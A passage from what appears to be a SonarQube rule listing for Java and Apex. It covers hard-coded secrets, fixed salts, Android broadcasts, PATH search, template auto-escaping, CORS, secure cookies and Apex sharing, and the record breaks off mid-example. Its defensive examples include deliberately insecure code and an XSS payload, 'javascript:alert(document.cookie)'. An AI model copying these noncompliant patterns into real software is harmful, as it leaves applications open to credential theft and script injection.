<p>Secrets should be stored outside of the source code in a configuration file or a management service for secrets.</p>
<p>This rule detects variables/fields having a name matching a list of words (secret, token, credential, auth, api[_.-]?key) being assigned a
pseudorandom hard-coded value. The pseudorandomness of the hard-coded value is based on its entropy and the probability to be human-readable. The
randomness sensibility can be adjusted if needed. Lower values will detect less random values, raising potentially more false positives.</p>
<h2>Ask Yourself Whether</h2>
<ul><li> The secret allows access to a sensitive component like a database, a file storage, an API, or a service. </li><li> The secret is used in a production environment. </li><li> Application re-distribution is required before updating the secret. </li></ul>
<p>There would be a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul><li> Store the secret in a configuration file that is not pushed to the code repository. </li><li> Use your cloud provider’s service for managing secrets. </li><li> If a secret has been disclosed through the source code: revoke it and create a new one. </li></ul>
<h2>Sensitive Code Example</h2>
<pre>
private static final String MY_SECRET &#61; &#34;47828a8dd77ee1eb9dde2d5e93cb221ce8c32b37&#34;;

public static void main(String[] args) {
  MyClass.callMyService(MY_SECRET);
}
</pre>
<h2>Compliant Solution</h2>
<p>Using <a href="https://github.com/awsdocs/aws-doc-sdk-examples/tree/main/javav2/example_code/secretsmanager" rel="nofollow">AWS Secrets Manager</a>:</p>
<pre>
import software.amazon.awssdk.services.secretsmanager.model.GetSecretValueRequest;
import software.amazon.awssdk.services.secretsmanager.model.GetSecretValueResponse;

public static void main(String[] args) {
  SecretsManagerClient secretsClient &#61; ...
  MyClass.doSomething(secretsClient, &#34;MY_SERVICE_SECRET&#34;);
}

public static void doSomething(SecretsManagerClient secretsClient, String secretName) {
  GetSecretValueRequest valueRequest &#61; GetSecretValueRequest.builder()
    .secretId(secretName)
    .build();

  GetSecretValueResponse valueResponse &#61; secretsClient.getSecretValue(valueRequest);
  String secret &#61; valueResponse.secretString();
  // do something with the secret
  MyClass.callMyService(secret);
}
</pre>
<p>Using <a href="https://docs.microsoft.com/en-us/azure/key-vault/secrets/quick-create-java?tabs&#61;azure-cli" rel="nofollow">Azure Key Vault Secret</a>:</p>
<pre>
import com.azure.identity.DefaultAzureCredentialBuilder;

import com.azure.security.keyvault.secrets.SecretClient;
import com.azure.security.keyvault.secrets.SecretClientBuilder;
import com.azure.security.keyvault.secrets.models.KeyVaultSecret;

public static void main(String[] args) throws InterruptedException, IllegalArgumentException {
  String keyVaultName &#61; System.getenv(&#34;KEY_VAULT_NAME&#34;);
  String keyVaultUri &#61; &#34;https://&#34; &#43; keyVaultName &#43; &#34;.vault.azure.net&#34;;

  SecretClient secretClient &#61; new SecretClientBuilder()
    .vaultUrl(keyVaultUri)
    .credential(new DefaultAzureCredentialBuilder().build())
    .buildClient();

  MyClass.doSomething(secretClient, &#34;MY_SERVICE_SECRET&#34;);
}

public static void doSomething(SecretClient secretClient, String secretName) {
  KeyVaultSecret retrievedSecret &#61; secretClient.getSecret(secretName);
  String secret &#61; retrievedSecret.getValue(),

  // do something with the secret
  MyClass.callMyService(secret);
}
</pre>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/" rel="nofollow">OWASP Top 10 2021 Category A7</a> - Identification and
  Authentication Failures </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A2_2017-Broken_Authentication" rel="nofollow">OWASP Top 10 2017 Category A2</a> - Broken Authentication
  </li><li> <a href="https://cwe.mitre.org/data/definitions/798.html" rel="nofollow">MITRE, CWE-798</a> - Use of Hard-coded Credentials </li><li> <a href="https://wiki.sei.cmu.edu/confluence/x/OjdGBQ" rel="nofollow">CERT, MSC03-J.</a> - Never hard code sensitive information </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=java:S2053">
              java:S2053
            </a>
          </td>
          <td>
            <details>
              <p>This vulnerability increases the likelihood that attackers are able to compute the cleartext of password hashes.</p>
<h2>Why is this an issue?</h2>
<p>During the process of password hashing, an additional component, known as a &#34;salt,&#34; is often integrated to bolster the overall security. This salt,
acting as a defensive measure, primarily wards off certain types of attacks that leverage pre-computed tables to crack passwords.</p>
<p>However, potential risks emerge when the salt is deemed insecure. This can occur when the salt is consistently the same across all users or when it
is too short or predictable. In scenarios where users share the same password and salt, their password hashes will inevitably mirror each other.
Similarly, a short salt heightens the probability of multiple users unintentionally having identical salts, which can potentially lead to identical
password hashes. These identical hashes streamline the process for potential attackers to recover clear-text passwords. Thus, the emphasis on
implementing secure, unique, and sufficiently lengthy salts in password-hashing functions is vital.</p>
<h3>What is the potential impact?</h3>
<p>Despite best efforts, even well-guarded systems might have vulnerabilities that could allow an attacker to gain access to the hashed passwords.
This could be due to software vulnerabilities, insider threats, or even successful phishing attempts that give attackers the access they need.</p>
<p>Once the attacker has these hashes, they will likely attempt to crack them using a couple of methods. One is brute force, which entails trying
every possible combination until the correct password is found. While this can be time-consuming, having the same salt for all users or a short salt
can make the task significantly easier and faster.</p>
<p>If multiple users have the same password and the same salt, their password hashes would be identical. This means that if an attacker successfully
cracks one hash, they have effectively cracked all identical ones, granting them access to multiple accounts at once.</p>
<p>A short salt, while less critical than a shared one, still increases the odds of different users having the same salt. This might create clusters
of password hashes with identical salt that can then be attacked as explained before.</p>
<p>With short salts, the probability of a collision between two users&#39; passwords and salts couple might be low depending on the salt size. The shorter
the salt, the higher the collision probability. In any case, using longer, cryptographically secure salt should be preferred.</p>
<h2>How to fix it in Java SE</h2>
<h3>Code examples</h3>
<p>The following code contains examples of hard-coded salts.</p>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
import javax.crypto.spec.PBEParameterSpec;

public void hash() {
    byte[] salt &#61; &#34;salty&#34;.getBytes();
    PBEParameterSpec cipherSpec &#61; new PBEParameterSpec(salt, 10000); // Noncompliant
}
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
import java.security.SecureRandom;
import javax.crypto.spec.PBEParameterSpec;

public void hash() {
    SecureRandom random &#61; new SecureRandom();
    byte[] salt &#61; new byte[16];
    random.nextBytes(salt);

    PBEParameterSpec cipherSpec &#61; new PBEParameterSpec(salt, 10000);
}
</pre>
<h3>How does this work?</h3>
<p>This code ensures that each user’s password has a unique salt value associated with it. It generates a salt randomly and with a length that
provides the required security level. It uses a salt length of at least 16 bytes (128 bits), as recommended by industry standards.</p>
<p>Here, the compliant code example ensures the salt is random and has a sufficient length by calling the <code>nextBytes</code> method from the
<code>SecureRandom</code> class with a salt buffer of 16 bytes. This class implements a cryptographically secure pseudo-random number generator.</p>
<h2>Resources</h2>
<h3>Standards</h3>
<ul><li> <a href="https://owasp.org/Top10/A02_2021-Cryptographic_Failures/" rel="nofollow">OWASP</a> Top 10:2021 A02:2021 - Cryptographic Failures </li><li> <a href="https://www.owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure" rel="nofollow">OWASP</a> - Top 10 2017 - A03:2017 - Sensitive Data
  Exposure </li><li> <a href="https://cwe.mitre.org/data/definitions/759" rel="nofollow">CWE</a> - CWE-759: Use of a One-Way Hash without a Salt </li><li> <a href="https://cwe.mitre.org/data/definitions/760" rel="nofollow">CWE</a> - CWE-760: Use of a One-Way Hash with a Predictable Salt </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=java:S5320">
              java:S5320
            </a>
          </td>
          <td>
            <details>
              <p>In Android applications, broadcasting intents is security-sensitive. For example, it has led in the past to the following vulnerability:</p>
<ul><li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name&#61;CVE-2018-9489" rel="nofollow">CVE-2018-9489</a> </li></ul>
<p>By default, broadcasted intents are visible to every application, exposing all sensitive information they contain.</p>
<p>This rule raises an issue when an intent is broadcasted without specifying any &#34;receiver permission&#34;.</p>
<h2>Ask Yourself Whether</h2>
<ul><li> The intent contains sensitive information. </li><li> Intent reception is not restricted. </li></ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>Restrict the access to broadcasted intents. See <a href="https://developer.android.com/guide/components/broadcasts.html#restricting_broadcasts_with_permissions" rel="nofollow">Android documentation</a> for more
information.</p>
<h2>Sensitive Code Example</h2>
<pre>
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.os.UserHandle;
import android.support.annotation.RequiresApi;

public class MyIntentBroadcast {
    &#64;RequiresApi(api &#61; Build.VERSION_CODES.JELLY_BEAN_MR1)
    public void broadcast(Intent intent, Context context, UserHandle user,
                          BroadcastReceiver resultReceiver, Handler scheduler, int initialCode,
                          String initialData, Bundle initialExtras,
                          String broadcastPermission) {
        context.sendBroadcast(intent); // Sensitive
        context.sendBroadcastAsUser(intent, user); // Sensitive

        // Broadcasting intent with &#34;null&#34; for receiverPermission
        context.sendBroadcast(intent, null); // Sensitive
        context.sendBroadcastAsUser(intent, user, null); // Sensitive
        context.sendOrderedBroadcast(intent, null); // Sensitive
        context.sendOrderedBroadcastAsUser(intent, user, null, resultReceiver,
                scheduler, initialCode, initialData, initialExtras); // Sensitive
    }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.os.UserHandle;
import android.support.annotation.RequiresApi;

public class MyIntentBroadcast {
    &#64;RequiresApi(api &#61; Build.VERSION_CODES.JELLY_BEAN_MR1)
    public void broadcast(Intent intent, Context context, UserHandle user,
                          BroadcastReceiver resultReceiver, Handler scheduler, int initialCode,
                          String initialData, Bundle initialExtras,
                          String broadcastPermission) {

        context.sendBroadcast(intent, broadcastPermission);
        context.sendBroadcastAsUser(intent, user, broadcastPermission);
        context.sendOrderedBroadcast(intent, broadcastPermission);
        context.sendOrderedBroadcastAsUser(intent, user,broadcastPermission, resultReceiver,
                scheduler, initialCode, initialData, initialExtras);
    }
}
</pre>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/Top10/A04_2021-Insecure_Design/" rel="nofollow">OWASP Top 10 2021 Category A4</a> - Insecure Design </li><li> <a href="https://mobile-security.gitbook.io/masvs/security-requirements/0x11-v6-interaction_with_the_environment" rel="nofollow">Mobile AppSec Verification
  Standard</a> - Platform Interaction Requirements </li><li> <a href="https://owasp.org/www-project-mobile-top-10/2016-risks/m1-improper-platform-usage" rel="nofollow">OWASP Mobile Top 10 2016 Category M1</a> - Improper
  Platform Usage </li><li> <a href="https://cwe.mitre.org/data/definitions/927" rel="nofollow">MITRE, CWE-927</a> - Use of Implicit Intent for Sensitive Communication </li><li> <a href="https://developer.android.com/guide/components/broadcasts.html#restricting_broadcasts_with_permissions" rel="nofollow">Android documentation</a> -
  Broadcast Overview - Security considerations and best practices </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=java:S4036">
              java:S4036
            </a>
          </td>
          <td>
            <details>
              <p>When executing an OS command and unless you specify the full path to the executable, then the locations in your application’s <code>PATH</code>
environment variable will be searched for the executable. That search could leave an opening for an attacker if one of the elements in
<code>PATH</code> is a directory under his control.</p>
<h2>Ask Yourself Whether</h2>
<ul><li> The directories in the PATH environment variable may be defined by not trusted entities. </li></ul>
<p>There is a risk if you answered yes to this question.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>Fully qualified/absolute path should be used to specify the OS command to execute.</p>
<h2>Sensitive Code Example</h2>
<p>The full path of the command is not specified and thus the executable will be searched in all directories listed in the <code>PATH</code>
environment variable:</p>
<pre>
Runtime.getRuntime().exec(&#34;make&#34;);  // Sensitive
Runtime.getRuntime().exec(new String[]{&#34;make&#34;});  // Sensitive

ProcessBuilder builder &#61; new ProcessBuilder(&#34;make&#34;);  // Sensitive
builder.command(&#34;make&#34;);  // Sensitive
</pre>
<h2>Compliant Solution</h2>
<p>The command is defined by its full path:</p>
<pre>
Runtime.getRuntime().exec(&#34;/usr/bin/make&#34;);  // Compliant
Runtime.getRuntime().exec(new String[]{&#34;~/bin/make&#34;});  // Compliant

ProcessBuilder builder &#61; new ProcessBuilder(&#34;./bin/make&#34;);  // Compliant
builder.command(&#34;../bin/make&#34;);  // Compliant
builder.command(Arrays.asList(&#34;..\bin\make&#34;, &#34;-j8&#34;)); // Compliant

builder &#61; new ProcessBuilder(Arrays.asList(&#34;.\make&#34;));  // Compliant
builder.command(Arrays.asList(&#34;C:\bin\make&#34;, &#34;-j8&#34;));  // Compliant
builder.command(Arrays.asList(&#34;\\SERVER\bin\make&#34;));  // Compliant
</pre>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/Top10/A08_2021-Software_and_Data_Integrity_Failures/" rel="nofollow">OWASP Top 10 2021 Category A8</a> - Software and Data
  Integrity Failures </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A1_2017-Injection" rel="nofollow">OWASP Top 10 2017 Category A1</a> - Injection </li><li> <a href="https://cwe.mitre.org/data/definitions/426" rel="nofollow">MITRE, CWE-426</a> - Untrusted Search Path </li><li> <a href="https://cwe.mitre.org/data/definitions/427" rel="nofollow">MITRE, CWE-427</a> - Uncontrolled Search Path Element </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=java:S5247">
              java:S5247
            </a>
          </td>
          <td>
            <details>
              <p>To reduce the risk of cross-site scripting attacks, templating systems, such as <code>Twig</code>, <code>Django</code>, <code>Smarty</code>,
<code>Groovy&#39;s template engine</code>, allow configuration of automatic variable escaping before rendering templates. When escape occurs, characters
that make sense to the browser (eg: &lt;a&gt;) will be transformed/replaced with escaped/sanitized values (eg: &amp; lt;a&amp; gt; ).</p>
<p>Auto-escaping is not a magic feature to annihilate all cross-site scripting attacks, it depends on <a href="https://twig.symfony.com/doc/3.x/filters/escape.html" rel="nofollow">the strategy applied</a> and the context, for example a &#34;html auto-escaping&#34; strategy
(which only transforms html characters into <a href="https://developer.mozilla.org/en-US/docs/Glossary/Entity" rel="nofollow">html entities</a>) will not be relevant
when variables are used in a <a href="https://en.wikipedia.org/wiki/HTML_attribute" rel="nofollow">html attribute</a> because &#39;<code>:</code>&#39; character is not
escaped and thus an attack as below is possible:</p>
<pre>
&lt;a href&#61;&#34;{<!-- -->{ myLink }}&#34;&gt;link&lt;/a&gt; // myLink &#61; javascript:alert(document.cookie)
&lt;a href&#61;&#34;javascript:alert(document.cookie)&#34;&gt;link&lt;/a&gt; // JS injection (XSS attack)
</pre>
<h2>Ask Yourself Whether</h2>
<ul><li> Templates are used to render web content and
    <ul><li> dynamic variables in templates come from untrusted locations or are user-controlled inputs </li><li> there is no local mechanism in place to sanitize or validate the inputs. </li></ul>  </li></ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>Enable auto-escaping by default and continue to review the use of inputs in order to be sure that the chosen auto-escaping strategy is the right
one.</p>
<h2>Sensitive Code Example</h2>
<p>With <a href="https://github.com/samskivert/jmustache" rel="nofollow">JMustache by samskivert</a>:</p>
<pre>
Mustache.compiler().escapeHTML(false).compile(template).execute(context); // Sensitive
Mustache.compiler().withEscaper(Escapers.NONE).compile(template).execute(context); // Sensitive
</pre>
<p>With <a href="https://freemarker.apache.org/" rel="nofollow">Freemarker</a>:</p>
<pre>
freemarker.template.Configuration configuration &#61; new freemarker.template.Configuration();
configuration.setAutoEscapingPolicy(DISABLE_AUTO_ESCAPING_POLICY); // Sensitive
</pre>
<h2>Compliant Solution</h2>
<p>With <a href="https://github.com/samskivert/jmustache" rel="nofollow">JMustache by samskivert</a>:</p>
<pre>
Mustache.compiler().compile(template).execute(context); // Compliant, auto-escaping is enabled by default
Mustache.compiler().escapeHTML(true).compile(template).execute(context); // Compliant
</pre>
<p>With <a href="https://freemarker.apache.org/" rel="nofollow">Freemarker</a>. See <a href="https://freemarker.apache.org/docs/api/freemarker/template/Configuration.html#setAutoEscapingPolicy-int-" rel="nofollow">&#34;setAutoEscapingPolicy&#34;
documentation</a> for more details.</p>
<pre>
freemarker.template.Configuration configuration &#61; new freemarker.template.Configuration();
configuration.setAutoEscapingPolicy(ENABLE_IF_DEFAULT_AUTO_ESCAPING_POLICY); // Compliant
</pre>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/Top10/A03_2021-Injection/" rel="nofollow">OWASP Top 10 2021 Category A3</a> - Injection </li><li> <a href="https://github.com/OWASP/CheatSheetSeries/blob/master/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.md" rel="nofollow">OWASP Cheat
  Sheet</a> - XSS Prevention Cheat Sheet </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A7_2017-Cross-Site_Scripting_%28XSS%29" rel="nofollow">OWASP Top 10 2017 Category A7</a> - Cross-Site
  Scripting (XSS) </li><li> <a href="https://cwe.mitre.org/data/definitions/79" rel="nofollow">MITRE, CWE-79</a> - Improper Neutralization of Input During Web Page Generation
  (&#39;Cross-site Scripting&#39;) </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=java:S5122">
              java:S5122
            </a>
          </td>
          <td>
            <details>
              <p>Having a permissive Cross-Origin Resource Sharing policy is security-sensitive. It has led in the past to the following vulnerabilities:</p>
<ul><li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name&#61;CVE-2018-0269" rel="nofollow">CVE-2018-0269</a> </li><li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name&#61;CVE-2017-14460" rel="nofollow">CVE-2017-14460</a> </li></ul>
<p><a href="https://developer.mozilla.org/en-US/docs/Web/Security/Same-origin_policy" rel="nofollow">Same origin policy</a> in browsers prevents, by default and for
security-reasons, a javascript frontend to perform a cross-origin HTTP request to a resource that has a different origin (domain, protocol, or port)
from its own. The requested target can append additional HTTP headers in response, called <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS" rel="nofollow">CORS</a>, that act like directives for the browser and change the access control policy
/ relax the same origin policy.</p>
<h2>Ask Yourself Whether</h2>
<ul><li> You don’t trust the origin specified, example: <code>Access-Control-Allow-Origin: untrustedwebsite.com</code>. </li><li> Access control policy is entirely disabled: <code>Access-Control-Allow-Origin: *</code> </li><li> Your access control policy is dynamically defined by a user-controlled input like <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Origin" rel="nofollow"><code>origin</code></a> header. </li></ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul><li> The <code>Access-Control-Allow-Origin</code> header should be set only for a trusted origin and for specific resources. </li><li> Allow only selected, trusted domains in the <code>Access-Control-Allow-Origin</code> header. Prefer whitelisting domains over blacklisting or
  allowing any domain (do not use * wildcard nor blindly return the <code>Origin</code> header content without any checks). </li></ul>
<h2>Sensitive Code Example</h2>
<p>Java servlet framework:</p>
<pre>
&#64;Override
protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
    resp.setHeader(&#34;Content-Type&#34;, &#34;text/plain; charset&#61;utf-8&#34;);
    resp.setHeader(&#34;Access-Control-Allow-Origin&#34;, &#34;*&#34;); // Sensitive
    resp.setHeader(&#34;Access-Control-Allow-Credentials&#34;, &#34;true&#34;);
    resp.setHeader(&#34;Access-Control-Allow-Methods&#34;, &#34;GET&#34;);
    resp.getWriter().write(&#34;response&#34;);
}
</pre>
<p>Spring MVC framework:</p>
<ul><li> <a href="https://docs.spring.io/spring-framework/docs/current/javadoc-api/org/springframework/web/bind/annotation/CrossOrigin.html" rel="nofollow">CrossOrigin</a>
  </li></ul>
<pre>
&#64;CrossOrigin // Sensitive
&#64;RequestMapping(&#34;&#34;)
public class TestController {
    public String home(ModelMap model) {
        model.addAttribute(&#34;message&#34;, &#34;ok &#34;);
        return &#34;view&#34;;
    }
}
</pre>
<ul><li> <a href="https://docs.spring.io/spring-framework/docs/current/javadoc-api/org/springframework/web/cors/CorsConfiguration.html" rel="nofollow">cors.CorsConfiguration</a> </li></ul>
<pre>
CorsConfiguration config &#61; new CorsConfiguration();
config.addAllowedOrigin(&#34;*&#34;); // Sensitive
config.applyPermitDefaultValues(); // Sensitive
</pre>
<ul><li> <a href="https://docs.spring.io/spring-framework/docs/current/javadoc-api/org/springframework/web/servlet/config/annotation/CorsRegistration.html" rel="nofollow">servlet.config.annotation.CorsConfiguration</a> </li></ul>
<pre>
class Insecure implements WebMvcConfigurer {
  &#64;Override
  public void addCorsMappings(CorsRegistry registry) {
    registry.addMapping(&#34;/**&#34;)
      .allowedOrigins(&#34;*&#34;); // Sensitive
  }
}
</pre>
<p>User-controlled origin:</p>
<pre>
public ResponseEntity&lt;String&gt; userControlledOrigin(&#64;RequestHeader(&#34;Origin&#34;) String origin) {
  HttpHeaders responseHeaders &#61; new HttpHeaders();
  responseHeaders.add(&#34;Access-Control-Allow-Origin&#34;, origin); // Sensitive

  return new ResponseEntity&lt;&gt;(&#34;content&#34;, responseHeaders, HttpStatus.CREATED);
}
</pre>
<h2>Compliant Solution</h2>
<p>Java Servlet framework:</p>
<pre>
&#64;Override
protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
    resp.setHeader(&#34;Content-Type&#34;, &#34;text/plain; charset&#61;utf-8&#34;);
    resp.setHeader(&#34;Access-Control-Allow-Origin&#34;, &#34;trustedwebsite.com&#34;); // Compliant
    resp.setHeader(&#34;Access-Control-Allow-Credentials&#34;, &#34;true&#34;);
    resp.setHeader(&#34;Access-Control-Allow-Methods&#34;, &#34;GET&#34;);
    resp.getWriter().write(&#34;response&#34;);
}
</pre>
<p>Spring MVC framework:</p>
<ul><li> <a href="https://docs.spring.io/spring-framework/docs/current/javadoc-api/org/springframework/web/bind/annotation/CrossOrigin.html" rel="nofollow">CrossOrigin</a>
  </li></ul>
<pre>
&#64;CrossOrigin(&#34;trustedwebsite.com&#34;) // Compliant
&#64;RequestMapping(&#34;&#34;)
public class TestController {
    public String home(ModelMap model) {
        model.addAttribute(&#34;message&#34;, &#34;ok &#34;);
        return &#34;view&#34;;
    }
}
</pre>
<ul><li> <a href="https://docs.spring.io/spring-framework/docs/current/javadoc-api/org/springframework/web/cors/CorsConfiguration.html" rel="nofollow">cors.CorsConfiguration</a> </li></ul>
<pre>
CorsConfiguration config &#61; new CorsConfiguration();
config.addAllowedOrigin(&#34;http://domain2.com&#34;); // Compliant
</pre>
<ul><li> <a href="https://docs.spring.io/spring-framework/docs/current/javadoc-api/org/springframework/web/servlet/config/annotation/CorsRegistration.html" rel="nofollow">servlet.config.annotation.CorsConfiguration</a> </li></ul>
<pre>
class Safe implements WebMvcConfigurer {
  &#64;Override
  public void addCorsMappings(CorsRegistry registry) {
    registry.addMapping(&#34;/**&#34;)
      .allowedOrigins(&#34;safe.com&#34;); // Compliant
  }
}
</pre>
<p>User-controlled origin validated with an allow-list:</p>
<pre>
public ResponseEntity&lt;String&gt; userControlledOrigin(&#64;RequestHeader(&#34;Origin&#34;) String origin) {
  HttpHeaders responseHeaders &#61; new HttpHeaders();
  if (trustedOrigins.contains(origin)) {
    responseHeaders.add(&#34;Access-Control-Allow-Origin&#34;, origin);
  }

  return new ResponseEntity&lt;&gt;(&#34;content&#34;, responseHeaders, HttpStatus.CREATED);
}
</pre>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/Top10/A05_2021-Security_Misconfiguration/" rel="nofollow">OWASP Top 10 2021 Category A5</a> - Security Misconfiguration </li><li> <a href="https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/" rel="nofollow">OWASP Top 10 2021 Category A7</a> - Identification and
  Authentication Failures </li><li> <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS" rel="nofollow">developer.mozilla.org</a> - CORS </li><li> <a href="https://developer.mozilla.org/en-US/docs/Web/Security/Same-origin_policy" rel="nofollow">developer.mozilla.org</a> - Same origin policy </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration" rel="nofollow">OWASP Top 10 2017 Category A6</a> - Security
  Misconfiguration </li><li> <a href="https://cheatsheetseries.owasp.org/cheatsheets/HTML5_Security_Cheat_Sheet.html#cross-origin-resource-sharing" rel="nofollow">OWASP HTML5 Security
  Cheat Sheet</a> - Cross Origin Resource Sharing </li><li> <a href="https://cwe.mitre.org/data/definitions/346" rel="nofollow">MITRE, CWE-346</a> - Origin Validation Error </li><li> <a href="https://cwe.mitre.org/data/definitions/942" rel="nofollow">MITRE, CWE-942</a> - Overly Permissive Cross-domain Whitelist </li><li> <a href="https://www.sans.org/top25-software-errors/#cat3" rel="nofollow">SANS Top 25</a> - Porous Defenses </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=java:S2092">
              java:S2092
            </a>
          </td>
          <td>
            <details>
              <p>When a cookie is protected with the <code>secure</code> attribute set to <em>true</em> it will not be send by the browser over an unencrypted HTTP
request and thus cannot be observed by an unauthorized person during a man-in-the-middle attack.</p>
<h2>Ask Yourself Whether</h2>
<ul><li> the cookie is for instance a <em>session-cookie</em> not designed to be sent over non-HTTPS communication. </li><li> it’s not sure that the website contains <a href="https://developer.mozilla.org/en-US/docs/Web/Security/Mixed_content" rel="nofollow">mixed content</a> or not
  (ie HTTPS everywhere or not) </li></ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul><li> It is recommended to use <code>HTTPs</code> everywhere so setting the <code>secure</code> flag to <em>true</em> should be the default behaviour
  when creating cookies. </li><li> Set the <code>secure</code> flag to <em>true</em> for session-cookies. </li></ul>
<h2>Sensitive Code Example</h2>
<p>If you create a security-sensitive cookie in your JAVA code:</p>
<pre>
Cookie c &#61; new Cookie(COOKIENAME, sensitivedata);
c.setSecure(false);  // Sensitive: a security-ensitive cookie is created with the secure flag set to false
</pre>
<p>By default the <a href="https://docs.oracle.com/javaee/6/api/javax/servlet/http/Cookie.html#setSecure%28boolean%29" rel="nofollow"><code>secure</code></a> flag is set
to <em>false:</em></p>
<pre>
Cookie c &#61; new Cookie(COOKIENAME, sensitivedata);  // Sensitive: a security-sensitive cookie is created with the secure flag not defined (by default set to false)
</pre>
<h2>Compliant Solution</h2>
<pre>
Cookie c &#61; new Cookie(COOKIENAME, sensitivedata);
c.setSecure(true); // Compliant: the sensitive cookie will not be send during an unencrypted HTTP request thanks to the secure flag set to true
</pre>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/Top10/A04_2021-Insecure_Design/" rel="nofollow">OWASP Top 10 2021 Category A4</a> - Insecure Design </li><li> <a href="https://owasp.org/Top10/A05_2021-Security_Misconfiguration/" rel="nofollow">OWASP Top 10 2021 Category A5</a> - Security Misconfiguration </li><li> <a href="https://www.owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure" rel="nofollow">OWASP Top 10 2017 Category A3</a> - Sensitive Data
  Exposure </li><li> <a href="https://cwe.mitre.org/data/definitions/311" rel="nofollow">MITRE, CWE-311</a> - Missing Encryption of Sensitive Data </li><li> <a href="https://cwe.mitre.org/data/definitions/315" rel="nofollow">MITRE, CWE-315</a> - Cleartext Storage of Sensitive Information in a Cookie </li><li> <a href="https://cwe.mitre.org/data/definitions/614" rel="nofollow">MITRE, CWE-614</a> - Sensitive Cookie in HTTPS Session Without &#39;Secure&#39; Attribute </li><li> <a href="https://www.sans.org/top25-software-errors/#cat3" rel="nofollow">SANS Top 25</a> - Porous Defenses </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=apex:S5377">
              apex:S5377
            </a>
          </td>
          <td>
            <details>
              <h2>Why is this an issue?</h2>
<p>By default Apex code executes without checking permissions. Hence the code will not enforce field level security, sharing rules and user
permissions during execution of Apex code in Triggers, Classes and Controllers. This creates the risk that unauthorized users may get access to
sensitive data records or fields.</p>
<p>To prevent this, developers should use <code>with sharing</code> keyword when declaring their classes if the class has SOQL or SOSL queries or DML
Statements. This will ensure that current user’s permissions, field level security and sharing rules are enforced during code execution. Thus users
will only see or modify records and fields which they have access to.</p>
<p>Use <code>without sharing</code> when a specific class should have full access to records without taking into account current user’s permissions.
This should be used very carefully.</p>
<p>Use <code>inherited sharing</code> when the code should inherit the level of access from the calling class. This is more secure than not specifying
a sharing level as the default will be equivalent to &#34;with sharing&#34;.</p>
<p>This rule raises an issue when a class containing DML, SOSL or SOQL queries has no sharing level specified (<code>with sharing</code>,
<code>without sharing</code>, <code>inherited sharing</code>).</p>
<h3>Noncompliant code example</h3>
<pre>
public class MyClass { // Noncompliant, no sharing specified
  List&lt;Case&gt; lstCases &#61; new List&lt;Case&gt;();
  for(Case c:[SELECT Id FROM Case WHERE Status &#61; &#39;In Progress&#39;]){ // SOQL query
      // ...
  }
}

public class MyClass { // Noncompliant
  List&lt;List&lt;SObject&gt;&gt; sList &#61; [FIND &#39;TEST&#39; IN ALL FIELDS
                                      RETURNING Case(Name), Contact(FirstName,LastName)]; // SOSL query

}

public class MyClass { // Noncompliant
  List&lt;Case&gt; lstCases &#61; new List&lt;Case&gt;();
  for(Case c:[SELECT Id, Status FROM Case WHERE Status &#61; &#39;In Progress&#39;]){
      c.Status &#61; &#39;Closed&#39;;
      lstCasesToBeUpdated.add(c);
  }
  Update lstCasesToBeUpdated;  // DML query
}
</pre>
<h3>Compliant solution</h3>
<pre>
public with sharing class MyClass {
  List&lt;Case&gt; lstCases &#61; new List&lt;Case&gt;();
  for(Case c:[SELECT Id FROM Case WHERE Status &#61; &#39;In Progress&#39;]){
      // ...
  }
}

public without sharing class MyClass {
